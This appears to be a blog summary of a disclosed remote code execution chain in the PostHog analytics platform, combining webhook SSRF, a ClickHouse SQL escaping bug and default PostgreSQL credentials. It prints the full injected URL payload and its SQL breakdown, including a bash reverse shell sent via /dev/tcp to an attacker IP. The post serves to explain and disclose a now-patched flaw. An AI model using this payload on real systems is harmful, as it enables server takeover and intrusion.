---
source_url: https://simonwillison.net/2025/Dec/18/ssrf-clickhouse-postgresql/
fetched: 2026-04-11
fetcher: on-demand
content_type: blog
slug: 2025-12-18-simon-willison-ssrf-clickhouse-postgresql
---

# Inside PostHog: How SSRF, a ClickHouse SQL Escaping 0day, and Default PostgreSQL Credentials Formed an RCE Chain

This report details a sophisticated Remote Code Execution (RCE) chain discovered in the PostHog analytics platform by Mehmet Ince. The attack successfully combined three distinct vulnerabilities to compromise an internal PostgreSQL server.

## The Vulnerability Chain
The attack sequence follows three primary stages:
1.  **SSRF via Webhooks:** Exploiting non-robust URL validation in PostHog's webhook system to make requests against internal network resources.
2.  **ClickHouse SQL Escaping 0day:** Using the SSRF to target an internal ClickHouse instance (port 8123) and exploiting a previously unknown escaping bug in the `postgresql()` table function.
3.  **PostgreSQL Default Credentials & RCE:** Leveraging default credentials and the `COPY ... FROM PROGRAM` command to execute shell commands.

## The Exploit Payload
The following URL was injected into the webhook system to trigger the chain:

```http
http://clickhouse:8123/?query=SELECT+_+FROM+postgresql('db:5432','posthog',\"posthog_use'))+TO+STDOUT;END;DROP+TABLE+IF+EXISTS+cmd_exec;CREATE+TABLE+cmd_exec(cmd_output+text);COPY+cmd_exec+FROM+PROGRAM+$$bash+-c+\\\"bash+-i+>%26+/dev/tcp/172.31.221.180/4444+0>%261\\\"$$;SELECT+_+FROM+cmd_exec;+--\\\",'posthog','posthog')#
```

### Deconstructed SQL Logic
When reformatted for readability, the payload reveals how it escapes the ClickHouse function to run arbitrary commands on the PostgreSQL database:

```sql
SELECT *
FROM postgresql(
    'db:5432',
    'posthog',
    "posthog_use')) TO STDOUT;
    END;
    DROP TABLE IF EXISTS cmd_exec;
    CREATE TABLE cmd_exec (
        cmd_output text
    );
    COPY cmd_exec
    FROM PROGRAM $$
        bash -c \"bash -i >& /dev/tcp/172.31.221.180/4444 0>&1\"
    $$;
    SELECT * FROM cmd_exec;
    --",
    'posthog',
    'posthog'
)
```

## Key Technical Insights
*   **ClickHouse Integration:** The attack abuses ClickHouse's legitimate feature that allows it to run queries against external PostgreSQL databases.
*   **The Escaping Bug:** The core of the 0day was an escaping failure in the ClickHouse `postgresql()` function, which allowed the attacker to "break out" of the intended query string and append malicious SQL.
*   **Reverse Shell:** The `COPY ... FROM PROGRAM` segment initiates a `bash` reverse shell. This forces the PostgreSQL server to connect back to the attacker's IP (`172.31.221.180`) on port `4444`, providing a remote command prompt.
*   **Remediation:** All vulnerabilities in this chain (SSRF, ClickHouse escaping, and PostHog's configuration) have been reported and fixed.

## Related Security Context
*   **ClickHouse Fix:** The SQL escaping bug was officially patched in [ClickHouse PR #74144](https://github.com/ClickHouse/ClickHouse/pull/74144).
*   **PostgreSQL Risk:** This highlights the extreme danger of the `COPY ... FROM PROGRAM` functionality when combined with SQL injection or default credentials.
